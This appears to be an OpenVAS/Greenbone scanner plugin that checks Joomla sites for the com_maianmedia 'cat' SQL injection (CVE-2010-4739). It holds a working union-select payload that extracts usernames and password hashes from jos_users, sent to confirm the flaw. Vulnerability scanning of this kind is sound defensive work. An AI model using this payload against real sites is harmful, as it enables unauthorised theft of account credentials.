# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800199");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-02-17 16:08:28 +0100 (Thu, 17 Feb 2011)");
  script_cve_id("CVE-2010-4739");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Joomla! com_maianmedia Component 'cat' Parameter SQL Injection Vulnerability");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to perform SQL Injection attack
  and gain sensitive information.");
  script_tag(name:"affected", value:"Joomla! Are Times Maian Media Component");
  script_tag(name:"insight", value:"The flaws are caused by improper validation of user-supplied input via the
  'cat' parameter to 'index.php', which allows attackers to manipulate SQL
  queries by injecting arbitrary SQL code.");
  script_tag(name:"solution", value:"An Update is available from vendor.");
  script_tag(name:"summary", value:"Joomla! with Maian Media Silver Component is prone to multiple SQL injection vulnerabilities.");
  script_xref(name:"URL", value:"http://secunia.com/advisories/42284");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/44877");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15555/");
  script_xref(name:"URL", value:"http://www.aretimes.com/index.php?option=com_content&view=category&layout=blog&id=40&Itemid=113");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

CPE = "cpe:/a:joomla:joomla";

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);

if(dir == "/") dir = "";

url = string(dir, "/index.php?option=com_maianmedia&view=music&cat=" +
                  "-9999+union+all+select+1,2,group_concat(name,char" +
                  "(58),username,char(58),usertype,char(58),password)" +
                  ",4,5,6,7,8,9,10,11,12,13,14,15,16,17+from+jos_users--");

if(http_vuln_check(port:port, url:url, pattern:'Administrator:admin:' +
                   'Super Administrator:', check_header:TRUE)) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
